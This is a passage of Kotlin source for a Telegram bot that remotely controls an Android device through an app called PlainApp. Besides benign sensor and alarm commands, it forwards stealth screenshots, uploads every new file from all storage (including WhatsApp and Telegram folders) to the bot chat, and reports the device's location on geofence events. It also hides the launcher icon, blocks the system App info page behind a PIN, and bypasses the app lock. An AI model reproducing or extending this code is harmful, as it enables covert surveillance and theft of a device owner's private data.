            "N" -> "⬆️"; "NE" -> "↗️"; "E" -> "➡️"; "SE" -> "↘️"
            "S" -> "⬇️"; "SW" -> "↙️"; "W" -> "⬅️"; "NW" -> "↖️"; else -> "🧭"
        }
        sendMessage(buildString {
            append("🧭 <b>Compass / Magnetometer</b>\n\n")
            append("$arrow <b>Heading:</b> <code>${d.heading}°</code> — <b>${d.cardinalDir}</b>\n\n")
            append("• <b>Magnetic X</b>: <code>${d.x}</code> µT\n")
            append("• <b>Magnetic Y</b>: <code>${d.y}</code> µT\n")
            append("• <b>Magnetic Z</b>: <code>${d.z}</code> µT\n")
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdBarometer() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_PRESSURE)) {
            sendMessage("❌ This device does not have a barometric pressure sensor.")
            return
        }
        val d = SensorHelper.latestBarometer
        sendMessage(buildString {
            append("🌡 <b>Barometer</b>\n\n")
            append("• <b>Pressure</b>: <code>${d.pressureHpa}</code> hPa\n")
            append("• <b>Altitude</b>: <code>${d.altitudeMeters}</code> m\n")
            append("\n<i>Standard sea-level: 1013.25 hPa</i>")
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdSteps() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_STEP_COUNTER)) {
            sendMessage("❌ This device does not have a step counter sensor.")
            return
        }
        val total = SensorHelper.stepCount
        sendMessage(buildString {
            append("👟 <b>Step Counter</b>\n\n")
            if (total < 0) {
                append("⏳ <i>Waiting for first step event… keep the phone moving.</i>")
            } else {
                append("• <b>Steps since reboot</b>: <code>$total</code>\n")
                val distM = total * 0.762
                val kcal = total * 0.04
                append("• <b>Est. distance</b>: <code>${String.format("%.1f", distM)}</code> m\n")
                append("• <b>Est. calories</b>: <code>${String.format("%.1f", kcal)}</code> kcal")
            }
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdProximity() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_PROXIMITY)) {
            sendMessage("❌ This device does not have a proximity sensor.")
            return
        }
        val near = SensorHelper.proximityNear
        val dist = SensorHelper.proximityDistance
        val max = SensorHelper.proximityMaxRange
        sendMessage(buildString {
            append("📡 <b>Proximity Sensor</b>\n\n")
            append(if (near) "🔴 <b>NEAR</b> — something is close to the sensor" else "🟢 <b>FAR</b> — nothing detected nearby")
            append("\n• Distance: <code>$dist</code> cm (max range: <code>$max</code> cm)")
            append("\n🕐 <i>$ts</i>")
        })
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  New System Control Commands
    // ─────────────────────────────────────────────────────────────────────────

    private fun cmdHotspot(args: List<String>) {
        val arg = args.getOrNull(0)?.lowercase()
        val current = SystemControlHelper.getHotspotEnabled()
        if (arg == null) {
            sendMessage("📶 <b>Mobile Hotspot</b>\n\nStatus: ${if (current) "✅ ON" else "🔴 OFF"}\n\nUse <code>/hotspot on</code> or <code>/hotspot off</code> to control.")
            return
        }
        val enable = arg == "on" || arg == "enable" || arg == "1"
        val ok = SystemControlHelper.setHotspotEnabled(enable)
        if (ok) sendMessage(if (enable) "✅ Hotspot turned <b>ON</b>" else "🔴 Hotspot turned <b>OFF</b>")
        else sendMessage("❌ Could not control hotspot — requires root or CHANGE_NETWORK_STATE (restricted on Android 8+).")
    }

    private fun cmdSetAlarm(args: List<String>) {
        val timeArg = args.getOrNull(1) ?: ""
        if (timeArg.isBlank() || !timeArg.matches(Regex("\\d{1,2}:\\d{2}"))) {
            sendMessage("⏰ <b>Set Alarm</b>\n\nUsage: <code>/setalarm HH:MM [label]</code>\nExample: <code>/setalarm 07:30 Wake up</code>")
            return
        }
        val label = args.drop(2).joinToString(" ").ifBlank { "PlainApp Alarm" }
        try {
            val parts = timeArg.split(":")
            val hour = parts[0].toInt()
            val minute = parts[1].toInt()
            val intent = android.content.Intent(android.provider.AlarmClock.ACTION_SET_ALARM).apply {
                putExtra(android.provider.AlarmClock.EXTRA_HOUR, hour)
                putExtra(android.provider.AlarmClock.EXTRA_MINUTES, minute)
                putExtra(android.provider.AlarmClock.EXTRA_MESSAGE, label)
                putExtra(android.provider.AlarmClock.EXTRA_SKIP_UI, true)
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            MainApp.instance.startActivity(intent)
            sendMessage("✅ Alarm set for <b>${timeArg}</b> — label: <i>${htmlEsc(label)}</i>")
        } catch (e: Exception) {
            sendMessage("❌ Could not set alarm: ${htmlEsc(e.message ?: "No clock app found")}")
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Battery Alert Command & Auto-Forward Toggle Commands
    // ─────────────────────────────────────────────────────────────────────────

    private suspend fun cmdBatteryAlert(args: List<String>) {
        val sub = args.getOrNull(0)?.lowercase()
        val threshArg = args.getOrNull(1)?.trimEnd('%')?.toIntOrNull()
        when (sub) {
            "on", "enable", "1" -> {
                forwardBatteryAlertEnabled = true
                coIO { TelegramBotForwardBatteryAlertPreference.putAsync(MainApp.instance, true) }
                if (threshArg != null) {
                    batteryAlertThreshold = threshArg.coerceIn(5, 95)
                    coIO { TelegramBotBatteryAlertThresholdPreference.putAsync(MainApp.instance, batteryAlertThreshold) }
                }
                sendMessage("✅ Battery alert <b>ON</b> — will notify when battery ≤ <b>${batteryAlertThreshold}%</b>")
            }
            "off", "disable", "0" -> {
                forwardBatteryAlertEnabled = false
                coIO { TelegramBotForwardBatteryAlertPreference.putAsync(MainApp.instance, false) }
                sendMessage("🔕 Battery alert <b>OFF</b>")
            }
            null -> {
                val state = if (forwardBatteryAlertEnabled) "✅ <b>ON</b> (threshold: ${batteryAlertThreshold}%)" else "🔕 <b>OFF</b>"
                sendMessage("🔋 <b>Battery Alert</b>\n\nStatus: $state\n\nUsage:\n<code>/batteryalert on [threshold%]</code>\n<code>/batteryalert off</code>\nExample: <code>/batteryalert on 20</code>")
            }
            else -> sendMessage("❓ Usage: <code>/batteryalert [on|off] [threshold%]</code>")
        }
    }

    private suspend fun cmdForwardGeofence(args: List<String>) {
        val sub = args.getOrNull(0)?.lowercase()
        when (sub) {
            "on", "enable", "1" -> {
                forwardGeofenceEnabled = true
                coIO { TelegramBotForwardGeofencePreference.putAsync(MainApp.instance, true) }
                sendMessage("✅ Geofence alerts <b>ON</b> — you'll receive enter/exit events in this chat")
            }
            "off", "disable", "0" -> {
                forwardGeofenceEnabled = false
                coIO { TelegramBotForwardGeofencePreference.putAsync(MainApp.instance, false) }
                sendMessage("🔕 Geofence alerts <b>OFF</b>")
            }
            null -> {
                val state = if (forwardGeofenceEnabled) "✅ <b>ON</b>" else "🔕 <b>OFF</b>"
                sendMessage("🗺 <b>Geofence Auto-Alerts</b>\n\nStatus: $state\n\nUse <code>/forwardgeofence on</code> or <code>/forwardgeofence off</code>")
            }
            else -> sendMessage("❓ Usage: <code>/forwardgeofence [on|off]</code>")
        }
    }

    private suspend fun cmdForwardShots(args: List<String>) {
        val sub = args.getOrNull(0)?.lowercase()
        when (sub) {
            "on", "enable", "1" -> {
                forwardStealthShotsEnabled = true
                coIO { TelegramBotForwardStealthShotsPreference.putAsync(MainApp.instance, true) }
                sendMessage("✅ Stealth screenshot auto-forward <b>ON</b> — new shots will be sent here")
            }
            "off", "disable", "0" -> {
                forwardStealthShotsEnabled = false
                coIO { TelegramBotForwardStealthShotsPreference.putAsync(MainApp.instance, false) }
                sendMessage("🔕 Stealth screenshot auto-forward <b>OFF</b>")
            }
            null -> {
                val state = if (forwardStealthShotsEnabled) "✅ <b>ON</b>" else "🔕 <b>OFF</b>"
                sendMessage("📸 <b>Stealth Screenshots Auto-Forward</b>\n\nStatus: $state\n\nUse <code>/forwardshots on</code> or <code>/forwardshots off</code>")
            }
            else -> sendMessage("❓ Usage: <code>/forwardshots [on|off]</code>")
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Auto-Forwarding Methods (called by Android services)
    // ─────────────────────────────────────────────────────────────────────────

    /** Called by LocationTrackingService when a geofence is triggered. */
    fun forwardGeofenceEvent(
        geofenceName: String,
        type: String,                // "enter" or "exit"
        lat: Double,
        lng: Double,
        batteryLevel: Int,
    ) {
        if (!isRunning || !forwardGeofenceEnabled || token.isBlank() || chatId.isBlank()) return
        val emoji = if (type == "enter") "🟢" else "🔴"
        val action = if (type == "enter") "ENTERED" else "EXITED"
        val txt = buildString {
            append("$emoji <b>Geofence $action</b>\n")
            append("📍 Zone: <b>${htmlEsc(geofenceName)}</b>\n")
            append("🌍 Lat: <code>$lat</code>  Lng: <code>$lng</code>\n")
            append("🔋 Battery: <b>${batteryLevel}%</b>\n")
            append("<a href=\"https://maps.google.com/?q=$lat,$lng\">📌 View on Google Maps</a>\n")
            append("🕐 <i>$ts</i>")
        }
        sendMessage(txt)
    }

    /** Called by battery monitoring to send a low-battery alert. */
    fun forwardBatteryAlert(level: Int) {
        if (!isRunning || !forwardBatteryAlertEnabled || token.isBlank() || chatId.isBlank()) return
        if (level > batteryAlertThreshold) return
        if (lastBatteryAlertLevel in 1..level) return
        lastBatteryAlertLevel = level
        val emoji = when {
            level <= 5 -> "🪫"
            level <= 10 -> "🔴"
            level <= 20 -> "🟠"
            else -> "🟡"
        }
        sendMessage("$emoji <b>Low Battery Alert</b>\n\n🔋 Battery is at <b>${level}%</b>\n⚡ Please charge the device soon.\n🕐 <i>$ts</i>")
    }

    // ==================== /forwardfiles ====================

    private fun cmdForwardFiles(args: List<String>) {
        val ctx = MainApp.instance
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        scope.launch {
            val current = TelegramFileForwardEnabledPreference.getAsync(ctx)
            val newEnabled = setEnabled ?: !current
            TelegramFileForwardEnabledPreference.putAsync(ctx, newEnabled)
            if (newEnabled) {
                FileForwardService.startIfEnabled(ctx)
                val q = FileForwardQueue.get(ctx)
                val pending = q.countPending()
                val done = q.countDone()
                val state = "✅ <b>ON</b> — monitoring all folders, forwarding every new file"
                val info = if (pending > 0) "\n📤 $pending file(s) currently queued for upload" else ""
                val rows = listOf(listOf("✅ Enable" to "filefwd_on", "🔕 Disable" to "filefwd_off"))
                sendMessage(
                    "📁 <b>File Auto-Forward</b>\n" +
                        "━━━━━━━━━━━━━━━━━━━━\n" +
                        "Status: $state$info\n\n" +
                        "📸 Photos, videos, audio, docs, APKs — everything\n" +
                        "🔍 All storage (DCIM, Downloads, WhatsApp, Telegram, Browser…)\n" +
                        "💾 Already forwarded: <b>$done</b> files\n\n" +
                        "<i>Use /fwdfiles to see recent uploads, /filestats for queue stats.</i>",
                    replyMarkup = TelegramApiClient.inlineKeyboard(rows),
                )
            } else {
                FileForwardService.stopService(ctx)
                val rows = listOf(listOf("✅ Enable" to "filefwd_on", "🔕 Disable" to "filefwd_off"))
                sendMessage(
                    "📁 <b>File Auto-Forward</b>\n" +
                        "━━━━━━━━━━━━━━━━━━━━\n" +
                        "Status: 🔕 <b>OFF</b> — monitoring paused\n\n" +
                        "<i>Re-enable with /forwardfiles on</i>",
                    replyMarkup = TelegramApiClient.inlineKeyboard(rows),
                )
            }
        }
    }

    private fun cmdFwdFiles(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 30) ?: 10
        val q = FileForwardQueue.get(ctx)
        val list = q.recentUploads(n)
        if (list.isEmpty()) {
            sendMessage("📁 <b>Forwarded Files</b>\n\nNo files have been uploaded yet.\n\n<i>Enable with /forwardfiles on</i>")
            return
        }
        val sdf = java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.getDefault())
        val sb = StringBuilder("📁 <b>Last ${list.size} Forwarded Files</b>\n━━━━━━━━━━━━━━━━━━━━\n\n")
        list.forEachIndexed { i, e ->
            val f = java.io.File(e.path)
            val name = f.name
            val tag = e.tag
            val size = FileForwardQueue.formatSize(e.size)
            val time = sdf.format(java.util.Date(e.detectedAt))
            val emoji = when {
                e.mime.startsWith("image/") -> "🖼"
                e.mime.startsWith("video/") -> "🎬"
                e.mime.startsWith("audio/") -> "🎵"
                e.mime == "application/pdf" -> "📄"
                e.mime.contains("zip") || e.mime.contains("rar") || e.mime.contains("7z") -> "📦"
                e.mime.contains("word") || e.mime.contains("excel") || e.mime.contains("sheet") -> "📊"
                else -> "📁"
            }
            sb.append("${i + 1}. $emoji <b>[${htmlEsc(tag)}]</b> ${htmlEsc(name)}\n")
            sb.append("   📏 $size  🕐 $time\n\n")
        }
        val total = q.countDone()
        val totalBytes = q.totalDoneBytes()
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📊 Total uploaded: <b>$total</b> files (${FileForwardQueue.formatSize(totalBytes)})")
        sendMessage(sb.toString())
    }

    private fun cmdFileStats() {
        val ctx = MainApp.instance
        val q = FileForwardQueue.get(ctx)
        val pending = q.countPending()
        val done = q.countDone()
        val failed = q.countFailed()
        val total = q.countTotal()
        val doneBytes = q.totalDoneBytes()
        val running = FileForwardService.isRunning()
        scope.launch {
            val enabled = TelegramFileForwardEnabledPreference.getAsync(ctx)
            val statusEmoji = if (running) "🟢" else if (enabled) "🟡" else "🔴"
            val statusText = if (running) "Running" else if (enabled) "Enabled (not running)" else "Disabled"
            val sb = buildString {
                append("📊 <b>File Auto-Forward Queue Stats</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━\n\n")
                append("$statusEmoji Service: <b>$statusText</b>\n\n")
                append("📤 Pending upload:    <b>$pending</b>\n")
                append("✅ Successfully sent: <b>$done</b>  (${FileForwardQueue.formatSize(doneBytes)})\n")
                append("❌ Permanently failed: <b>$failed</b>\n")
                append("📋 Total seen:         <b>$total</b>\n\n")
                if (failed > 0) {
                    append("<i>Use /retryfailed to reset failed entries and retry them.</i>\n")
                }
                if (!running && enabled) {
                    append("<i>Use /forwardfiles on to restart the service.</i>")
                }
            }
            val rows = mutableListOf<List<Pair<String, String>>>()
            if (!running) rows.add(listOf("▶️ Start" to "filefwd_on"))
            if (running) rows.add(listOf("⏹ Stop" to "filefwd_off"))
            if (failed > 0) rows.add(listOf("🔄 Retry Failed" to "filefwd_retry"))
            sendMessage(sb, replyMarkup = if (rows.isNotEmpty()) TelegramApiClient.inlineKeyboard(rows) else null)
        }
    }

    private fun cmdRetryFailed() {
        val ctx = MainApp.instance
        val q = FileForwardQueue.get(ctx)
        val reset = q.resetFailed()
        if (reset == 0) {
            sendMessage("🔄 <b>Retry Failed</b>\n\nNo permanently-failed uploads found. All clear!")
            return
        }
        sendMessage(
            "🔄 <b>Retry Failed</b>\n\n" +
                "✅ Reset <b>$reset</b> failed upload(s) back to pending.\n" +
                "⬆️ They will be retried on the next upload cycle.",
        )
        FileForwardService.startIfEnabled(ctx)
    }

    /** Called by FileForwardService to notify bot about auto-forward toggle. */
    fun notifyFileForwardEnabled(enabled: Boolean) {
        if (!isRunning || token.isBlank() || chatId.isBlank()) return
        val ctx = MainApp.instance
        val q = FileForwardQueue.get(ctx)
        val msg = if (enabled) {
            "📁 <b>File Auto-Forward Started</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "🟢 Now monitoring all storage for new files\n" +
                "📊 Queue: ${q.countPending()} pending, ${q.countDone()} already sent"
        } else {
            "📁 <b>File Auto-Forward Stopped</b>\n🔴 Monitoring paused."
        }
        sendMessage(msg)
    }

    // ── App Settings commands ─────────────────────────────────────────────────

    private suspend fun cmdAppSettings() {
        sendTyping()
        renderAppSettingsStatus(editMessageId = null)
    }

    private suspend fun renderAppSettingsStatus(editMessageId: Long?) {
        val ctx = MainApp.instance
        val lockEnabled = AppLockEnabledPreference.getAsync(ctx)
        val biometricEnabled = AppLockBiometricEnabledPreference.getAsync(ctx)
        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
        val iconHidden = LauncherIconHelper.isHidden(ctx)
        val appInfoGuard = AppInfoGuardEnabledPreference.getAsync(ctx)
        val botPwdEnabled = TelegramBotPasswordEnabledPreference.getAsync(ctx)
        val botPwdSet = TelegramBotPasswordPreference.getAsync(ctx).isNotBlank()
        val secQuestion = SecurityQuestionPreference.getAsync(ctx)
        val secAnswerSet = SecurityAnswerPreference.getAsync(ctx).isNotBlank()

        val sb = buildString {
            append("⚙️ <b>App Settings</b>\n━━━━━━━━━━━━━━━━━━━━\n\n")
            append("👁 Launcher icon: <b>${if (iconHidden) "🔴 Hidden" else "🟢 Visible"}</b>\n\n")
            append("🔒 <b>App Lock</b>\n")
            append("  Lock enabled: <b>${if (lockEnabled) "🟢 ON" else "⚪ OFF"}</b>\n")
            append("  PIN set: <b>${if (hasPin) "✅ Yes" else "❌ No"}</b>\n")
            append("  Biometric: <b>${if (biometricEnabled) "🟢 ON" else "⚪ OFF"}</b>\n")
            append("  App info guard: <b>${if (appInfoGuard) "🟢 ON" else "⚪ OFF"}</b>\n\n")
            append("🤖 <b>Telegram Bot Password</b>\n")
            append("  Protection: <b>${if (botPwdEnabled) "🟢 Enabled" else "⚪ Disabled"}</b>\n")
            append("  Password set: <b>${if (botPwdSet) "✅ Yes" else "❌ No"}</b>\n\n")
            append("❓ <b>Security Q&A (Dashboard Gate)</b>\n")
            append("  Question: <i>${htmlEsc(secQuestion.take(80))}</i>\n")
            append("  Answer set: <b>${if (secAnswerSet) "✅ Yes" else "❌ No"}</b>")
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        rows.add(listOf(
            if (iconHidden) "🟢 Show Icon" to "aps_icon_off" else "🔴 Hide Icon" to "aps_icon_on"
        ))
        rows.add(listOf(
            if (lockEnabled) "🔓 Disable Lock" to "aps_lock_off" else "🔒 Enable Lock" to "aps_lock_on",
            if (biometricEnabled) "🚫 Biometric OFF" to "aps_bio_off" else "🪪 Biometric ON" to "aps_bio_on"
        ))
        rows.add(listOf(
            if (appInfoGuard) "🛡 InfoGuard OFF" to "aps_infog_off" else "🛡 InfoGuard ON" to "aps_infog_on"
        ))
        rows.add(listOf("🔑 Set/Change PIN" to "aps_setpin", "🗑 Remove PIN" to "aps_removepin"))
        rows.add(listOf(
            if (botPwdEnabled) "🔐 BotPwd OFF" to "aps_botpwd_off" else "🔐 BotPwd ON" to "aps_botpwd_on",
            "🔑 Change BotPwd" to "aps_setbotpwd"
        ))
        rows.add(listOf("❓ Change Security Q&A" to "aps_secqa"))
        rows.add(listOf("📱 Open App on Device" to "aps_openapp", "📋 Open App Info" to "aps_openappinfo"))
        rows.add(listOf("🔄 Refresh" to "aps_refresh"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb, replyMarkup = markup)
        else sendMessage(sb, replyMarkup = markup)
    }

    private suspend fun cmdHideIcon(args: List<String>) {
        val ctx = MainApp.instance
        when (args.firstOrNull()?.lowercase()) {
            "on", "hide", "1", "true" -> {
                LauncherIconHelper.setHidden(ctx, true)
                LauncherIconHiddenPreference.putAsync(ctx, true)
            }
            "off", "show", "0", "false" -> {
                LauncherIconHelper.setHidden(ctx, false)
                LauncherIconHiddenPreference.putAsync(ctx, false)
            }
            null, "" -> { /* just show */ }
            else -> { sendMessage("Usage: /hideicon [on|off]"); return }
        }
        val hidden = LauncherIconHelper.isHidden(ctx)
        sendMessage(
            "👁 <b>Launcher Icon</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
            "State: <b>${if (hidden) "🔴 Hidden" else "🟢 Visible"}</b>",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("🔴 Hide" to "aps_icon_on", "🟢 Show" to "aps_icon_off")
            ))
        )
    }

    private suspend fun cmdAppLockToggle(args: List<String>) {
        val ctx = MainApp.instance
        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
        when (args.firstOrNull()?.lowercase()) {
            "on", "enable", "1", "true" -> {
                if (!hasPin) { sendMessage("❌ Set a PIN first with /setpin before enabling the app lock."); return }
                AppLockEnabledPreference.putAsync(ctx, true)
            }
            "off", "disable", "0", "false" -> AppLockEnabledPreference.putAsync(ctx, false)
            null, "" -> { /* just show */ }
            else -> { sendMessage("Usage: /applock [on|off]"); return }
        }
        val enabled = AppLockEnabledPreference.getAsync(ctx)
        sendMessage(
            "🔒 <b>App Lock</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
            "State: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>\n" +
            "PIN: <b>${if (hasPin) "✅ Set" else "❌ Not set — use /setpin first"}</b>",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("🔒 Enable" to "aps_lock_on", "🔓 Disable" to "aps_lock_off")
            ))
        )
    }

    private suspend fun cmdBiometric(args: List<String>) {
        val ctx = MainApp.instance
        when (args.firstOrNull()?.lowercase()) {
            "on", "enable", "1", "true" -> AppLockBiometricEnabledPreference.putAsync(ctx, true)
            "off", "disable", "0", "false" -> AppLockBiometricEnabledPreference.putAsync(ctx, false)
            null, "" -> { /* just show */ }
            else -> { sendMessage("Usage: /biometric [on|off]"); return }
        }
        val enabled = AppLockBiometricEnabledPreference.getAsync(ctx)
        sendMessage(
            "🪪 <b>Biometric Unlock</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
            "State: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("🪪 Enable" to "aps_bio_on", "🚫 Disable" to "aps_bio_off")
            ))
        )
    }

    private suspend fun cmdAppInfoGuard(args: List<String>) {
        val ctx = MainApp.instance
        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
        when (args.firstOrNull()?.lowercase()) {
            "on", "enable", "1", "true" -> {
                if (!hasPin) { sendMessage("❌ Set a PIN first with /setpin before enabling the App info guard."); return }
                AppInfoGuardEnabledPreference.putAsync(ctx, true)
                AppInfoGuard.invalidateCache()
            }
            "off", "disable", "0", "false" -> {
                AppInfoGuardEnabledPreference.putAsync(ctx, false)
                AppInfoGuard.invalidateCache()
            }
            null, "" -> { /* just show */ }
            else -> { sendMessage("Usage: /appinfog [on|off]"); return }
        }
        val enabled = AppInfoGuardEnabledPreference.getAsync(ctx)
        sendMessage(
            "🛡 <b>App Info Guard</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
            "Blocks system App info pages behind the PlainApp PIN.\n" +
            "State: <b>${if (enabled) "🟢 Enabled" else "⚪ Disabled"}</b>",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("🛡 Enable" to "aps_infog_on", "🚫 Disable" to "aps_infog_off")
            ))
        )
    }

    private suspend fun cmdSetPin() {
        val ctx = MainApp.instance
        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
        if (hasPin) {
            pendingInput = "setpin_verify"
            sendMessage("🔑 <b>Change App PIN</b>\n\nType your <b>current PIN</b> to confirm your identity.\nSend any /command to cancel.")
        } else {
            pendingInput = "setpin_new"
            sendMessage("🔑 <b>Set App PIN</b>\n\nNo PIN is set yet. Type a <b>new PIN</b> (4–12 digits).\nSend any /command to cancel.")
        }
    }

    private suspend fun cmdRemovePin() {
        val ctx = MainApp.instance
        val hasPin = AppLockPinPreference.getAsync(ctx).isNotEmpty()
        if (!hasPin) {
            sendMessage("ℹ️ No PIN is currently set. Nothing to remove.")
            return
        }
        pendingInput = "removepin_verify"
        sendMessage("🗑 <b>Remove App PIN</b>\n\nType your <b>current PIN</b> to confirm removal.\nThis will also disable the app lock and biometric unlock.\nSend any /command to cancel.")
    }

    private fun cmdOpenApp() {
        val ctx = MainApp.instance
        try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
                ?: android.content.Intent().apply {
                    setClassName(ctx.packageName, "com.ismartcoding.plain.ui.MainActivity")
                }
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            ctx.startActivity(intent)
            sendMessage("📱 <b>Opening PlainApp</b>\n\nPlainApp is being brought to the foreground on the device.")
        } catch (e: Exception) {
            sendMessage("❌ Could not open the app: ${htmlEsc(e.message ?: "unknown")}")
        }
    }

    private suspend fun cmdOpenOwnAppInfo() {
        val ctx = MainApp.instance
        try {
            // Pre-mark the guard as verified so it doesn't re-block our own
            // navigation immediately after we open the page.
            AppInfoGuard.markVerified()
            val intent = android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.fromParts("package", ctx.packageName, null)
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            ctx.startActivity(intent)
            sendMessage("📋 <b>Opened PlainApp App Info</b>\n\nSystem App Info page for PlainApp is now open on the device.\n\n<i>Settings → Apps → PlainApp</i>")
        } catch (e: Exception) {
            sendMessage("❌ Could not open App Info: ${htmlEsc(e.message ?: "unknown")}")
        }
    }

    /** Shared helper — bring app to foreground, bypass lock, navigate to any route. */
    private suspend fun navigateInApp(pageName: String, route: Any): Boolean {
        val ctx = MainApp.instance
        return try {
            val launchIntent = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
                ?: android.content.Intent().apply {
                    setClassName(ctx.packageName, "com.ismartcoding.plain.ui.MainActivity")
                }
            launchIntent.addFlags(
                android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
            )
            ctx.startActivity(launchIntent)
            kotlinx.coroutines.delay(800)
            val activity = com.ismartcoding.plain.ui.MainActivity.instance.get() ?: return false
            activity.runOnUiThread {
                activity.isLocked = false
                activity.navControllerState.value?.navigate(route) { launchSingleTop = true }
            }
            true
        } catch (_: Exception) { false }
    }

    private suspend fun cmdOpenPage() {
        data class Page(val key: String, val label: String)
        data class Group(val header: String, val pages: List<Page>)

        val groups = listOf(
            Group("🏠 Main", listOf(
                Page("home",        "🏠 Home"),
                Page("settings",    "⚙️ App Settings"),
            )),
            Group("🌐 Web Console", listOf(
                Page("websettings",  "🌐 Web Settings"),
                Page("websecurity",  "🔐 Web Security"),
                Page("sessions",     "🔑 Web Sessions"),
                Page("webdev",       "🛠 Web Dev Mode"),
                Page("cloudflare",   "☁️ Cloudflare Tunnel"),
                Page("cflog",        "📋 Tunnel Log"),
                Page("alwayson",     "⚡ Always On Screen"),
            )),
            Group("🔐 Security", listOf(
                Page("applock",      "🔒 App Lock"),
                Page("launchericon", "👁 Launcher Icon"),
                Page("securityqa",   "❓ Security Q&A"),
                Page("telegrambot",  "🤖 Telegram Bot"),
            )),
            Group("📁 Files & Media", listOf(
                Page("files",        "📁 Files"),
                Page("appfiles",     "📦 App Files"),
                Page("images",       "🖼 Images"),
                Page("videos",       "🎬 Videos"),
                Page("audio",        "🎵 Audio"),
                Page("audioplayer",  "▶️ Audio Player"),
                Page("docs",         "📄 Documents"),
                Page("apps",         "📱 Apps"),
            )),
            Group("💬 Communication", listOf(
                Page("chatlist",     "💬 Chat List"),
                Page("chat",         "🗨 Local Chat"),
                Page("nearby",       "📡 Nearby Devices"),
            )),
            Group("📝 Productivity", listOf(
                Page("notes",        "📝 Notes"),
                Page("feeds",        "📡 RSS Feeds"),
                Page("feedsettings", "⚙️ Feed Settings"),
                Page("scan",         "📷 Scan QR"),
                Page("scanhistory",  "🕐 Scan History"),
                Page("exchangerate", "💱 Exchange Rate"),
                Page("pomodoro",     "🍅 Pomodoro Timer"),
                Page("soundmeter",   "🎙 Sound Meter"),
            )),
            Group("⚙️ Appearance & App", listOf(
                Page("customfeatures",   "✨ Custom Features"),
                Page("notifsettings",    "🔔 Notification Settings"),
                Page("language",         "🌐 Language"),
                Page("darktheme",        "🌙 Dark Theme"),
                Page("backup",           "💾 Backup & Restore"),
                Page("howtouse",         "❓ How To Use"),
            )),
            Group("📺 Hardware", listOf(
                Page("dlna",         "📺 DLNA Receiver"),
                Page("dlnahistory",  "📋 DLNA Cast History"),
            )),
        )

        val totalPages = groups.sumOf { it.pages.size }
        val sb = StringBuilder()
        sb.append("📱 <b>Open Page on Device</b>\n")
        sb.append("Tap any button — PlainApp will open that page <b>right now</b>, bypassing app lock.\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("<b>$totalPages pages available</b>\n\n")
        groups.forEach { g ->
            sb.append("${g.header}: ${g.pages.joinToString(" · ") { it.label }}\n")
        }
        sb.append("\n🕐 $ts")

        val rows = mutableListOf<List<Pair<String, String>>>()
        groups.forEach { g ->
            // Group header row (single non-clickable label workaround — use a disabled-style button)
            rows.add(listOf(g.header to "pg_hdr:${g.header}"))
            // Page buttons 2 per row
            g.pages.chunked(2).forEach { chunk ->
                rows.add(chunk.map { p -> p.label to "pg:${p.key}" })
            }
        }
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private suspend fun cmdOpenWebSettings() {
        val ctx = MainApp.instance
        try {
            // Step 1 — Bring the app to the foreground
            val launchIntent = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
                ?: android.content.Intent().apply {
                    setClassName(ctx.packageName, "com.ismartcoding.plain.ui.MainActivity")
                }
            launchIntent.addFlags(
                android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
            )
            ctx.startActivity(launchIntent)

            // Step 2 — Wait for the activity to reach the foreground
            kotlinx.coroutines.delay(800)

            // Step 3 — Bypass app lock (PIN screen) and navigate to Web Settings.
            //   isLocked and navControllerState are `internal` on MainActivity,
            //   so they are accessible from this module without reflection.
            val activity = com.ismartcoding.plain.ui.MainActivity.instance.get()
            if (activity == null) {
